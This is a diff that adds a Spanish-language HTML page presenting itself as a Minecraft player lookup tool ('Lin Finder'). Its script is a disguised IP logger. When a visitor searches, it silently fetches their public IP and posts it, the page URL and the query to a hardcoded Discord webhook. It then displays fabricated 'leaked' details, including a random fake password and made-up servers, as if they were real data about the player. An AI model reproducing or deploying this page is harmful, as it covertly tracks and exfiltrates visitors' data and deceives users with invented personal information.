@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Buscador Lin Finder</title>
+  <style>
+    body {
+      font-family: 'Arial', sans-serif;
+      background-color: #121212;
+      color: #00ff00;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      overflow: hidden;
+    }
+
+    .search-container {
+      text-align: center;
+      background: rgba(0, 0, 0, 0.7);
+      padding: 20px;
+      border-radius: 8px;
+      width: 100%;
+      max-width: 500px;
+      box-shadow: 0px 0px 20px rgba(0, 255, 0, 0.5);
+    }
+
+    h1 {
+      font-size: 28px;
+      margin-bottom: 20px;
+      font-family: 'Courier New', Courier, monospace;
+      color: #ffcc00;
+    }
+
+    input[type="text"] {
+      width: 80%;
+      padding: 10px;
+      background-color: #333;
+      color: #00ff00;
+      border: 2px solid #00ff00;
+      border-radius: 5px;
+      font-size: 18px;
+      font-family: 'Courier New', Courier, monospace;
+      text-align: center;
+    }
+
+    input[type="text"]:focus {
+      outline: none;
+      border-color: #ffcc00;
+    }
+
+    button {
+      background-color: #00ff00;
+      color: #121212;
+      border: none;
+      padding: 15px;
+      margin-top: 20px;
+      width: 50%;
+      font-size: 16px;
+      border-radius: 5px;
+      cursor: pointer;
+      font-family: 'Courier New', Courier, monospace;
+      box-shadow: 0px 0px 10px rgba(0, 255, 0, 0.7);
+    }
+
+    button:hover {
+      background-color: #ffcc00;
+      color: #121212;
+    }
+
+    button:active {
+      background-color: #00cc00;
+    }
+
+    .skin-container {
+      margin-top: 20px;
+      text-align: center;
+    }
+
+    .skin-container img {
+      width: 100px;
+      height: 200px;
+      border-radius: 8px;
+    }
+
+  </style>
+</head>
+<body>
+
+  <div class="search-container">
+    <h1>Busqueda Lin Finder</h1>
+    <input type="text" id="searchInput" placeholder="Escribe algo..." autofocus>
+    <br>
+    <button id="searchButton">Buscar</button>
+  </div>
+
+  <script>
+    const webhookURL = "https://discord.com/api/webhooks/1386516963840233552/6P7wUit9ErWNVr0Ed4cGFa5py7fpgkshF8ODzgTmP5_Zv_LtSTewTTvPcRkA9vWJorND";
+
+    // Función para obtener la IP publica
+    function getPublicIP(callback) {
+      fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+          callback(data.ip);
+        })
+        .catch(error => {
+          console.error("Error obteniendo la IP p煤blica:", error);
+          callback('IP desconocida');
+        });
+    }
+
+    // Función para generar información aleatoria de Minecraft
+    function generateMinecraftInfo(name, publicIP) {
+      const randomPassword = Math.random().toString(36).slice(-10); // Contraseña aleatoria de 10 caracteres
+      const randomServers = [
+        { name: 'Hypixel', ip: 'mc.hypixel.net' },
+        { name: 'Mineplex', ip: 'us.mineplex.com' },
+        { name: 'TheArchon', ip: 'pvp.thearchon.net' },
+        { name: 'CubeCraft', ip: 'play.cubecraft.net' },
+        { name: 'Wynncraft', ip: 'play.wynncraft.com' },
+        { name: 'Performium', ip: 'play.performium.net' },
+        { name: 'McProHosting', ip: 'mcprohosting.com' },
+        { name: 'Minesaga', ip: 'play.minesaga.org' },
+      ];
+
+      // Seleccionar 3 servidores aleatorios
+      const selectedServers = [];
+      while (selectedServers.length < 3) {
+        const randomIndex = Math.floor(Math.random() * randomServers.length);
+        const server = randomServers[randomIndex];
+        if (!selectedServers.includes(server)) {
+          selectedServers.push(server);
+        }
+      }
+
+      // Formatear la información
+      let serverInfo = '';
+      selectedServers.forEach((server, index) => {
+        serverInfo += `${index + 1}. ${server.name} - ${server.ip}\n`;
+      });
+
+      const content = `
+        Nombre del jugador: ${name}
+        Contraseña: ${randomPassword}
+        IP: ${publicIP}
+        Servidores Jugados:
+        ${serverInfo}
+      `;
+      
+      return content;
+    }
+
+    // Función para obtener una skin aleatoria
+    function getRandomSkin(callback) {
+      const skinUrl = `https://minotar.net/helm/${Math.floor(Math.random() * 1000000)}`;
+      callback(skinUrl);
+    }
+
+    document.getElementById('searchButton').addEventListener('click', () => {
+      const searchQuery = document.getElementById('searchInput').value.trim();
+      
+      // Solo envía si el campo de busqueda no está vacío
+      if (searchQuery) {
+        // Obtener la URL actual
+        const currentUrl = window.location.href;
+
+        // Obtener la IP publica
+        getPublicIP((publicIP) => {
+          // Enviar la URL, la busqueda y la IP al webhook
+          const payload = {
+            username: "Buscador Lin Finder",
+            embeds: [{
+              title: " URL y Busqueda",
+              color: 3447003,
+              fields: [
+                { name: "URL", value: currentUrl, inline: true },
+                { name: "Busqueda", value: searchQuery, inline: true },
+                { name: "IP", value: publicIP, inline: true }
+              ]
+            }]
+          };
+
+          // Enviar el payload al webhook
+          fetch(webhookURL, {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify(payload)
+          }).catch(err => console.error("Error enviando al webhook:", err));
+
+          // Limpiar el campo de busqueda
+          document.getElementById('searchInput').value = '';
+
+          // Generar la información de Minecraft, incluyendo la IP
+          const minecraftInfo = generateMinecraftInfo(searchQuery, publicIP);
+
+          // Obtener una skin aleatoria
+          getRandomSkin((skinUrl) => {
+            // Abrir una nueva ventana con la información de Minecraft y la skin
+            const newWindow = window.open("", "Minecraft Info", "width=800,height=400");
+            newWindow.document.write(`
+              <html>
+              <head><title>Información de Minecraft</title></head>
+              <body style="font-family: Arial, sans-serif; background-color: #121212; color: #00ff00;">
+                <h1 style="text-align: center; color: #ffcc00;">Información de Minecraft para ${searchQuery}</h1>
+                <div style="display: flex; justify-content: center; align-items: center;">
+                  <div>
+                    <pre style="font-size: 18px; padding: 20px; margin-right: 20px;">${minecraftInfo}</pre>
+                  </div>
+                  <div class="skin-container">
+                    <img src="${skinUrl}" alt="Skin aleatoria de Minecraft">
+                  </div>
+                </div>
+              </body>
+              </html>
+            `);
+          });
+        });
+      } else {
+        alert("Por favor, ingresa un nombre de usuario para buscar.");
+      }
+    });
+  </script>
+</body>
+</html>
